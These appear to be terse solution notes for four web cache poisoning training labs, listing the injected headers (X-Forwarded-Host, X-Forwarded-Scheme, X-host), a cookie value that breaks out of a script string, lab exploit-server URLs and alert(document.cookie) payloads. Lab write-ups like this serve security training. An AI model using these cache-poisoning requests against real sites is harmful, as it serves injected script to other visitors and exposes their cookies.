```
Lab: Web cache poisoning with an unkeyed header

PRACTITIONER

This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way.
An unsuspecting user regularly visits the site's home page.
To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 
```

X-Forwarded-Host: exploit-0af500bc03f1605e8088526401d600f4.exploit-server.net/exploit

File: /exploit/resources/js/tracking.js

Body: alert(document.cookie);

---
```
Lab: Web cache poisoning with an unkeyed cookie

PRACTITIONER

This lab is vulnerable to web cache poisoning because cookies aren't included in the cache key. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(1) in the visitor's browser. 
```
Run param miner, then update the header and add : 

Cookie: fehost=akzldka"-alert(1)-"test;

---
```
Lab: Web cache poisoning with multiple headers

PRACTITIONER

This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 
```
Run param miner, X-Forwarded-Scheme detected

GET /resources/js/tracking.js

X-Forwarded-Host: exploit-0a7d008d040cac95809f6c3d01060031.exploit-server.net

X-Forwarded-Scheme: test

---

```
Lab: Targeted web cache poisoning using an unknown header

PRACTITIONER

This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

```
* Run param miner, x-host header detected

* User-agent of the victim triggered with (comment section) : 

<img src="https://exploit-0a5a008c04375d26804d117001d9003b.exploit-server.net/exploit">

> user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36

 X-host: exploit-0ae700ad048a44c18279c8a901c90073.exploit-server.net

---
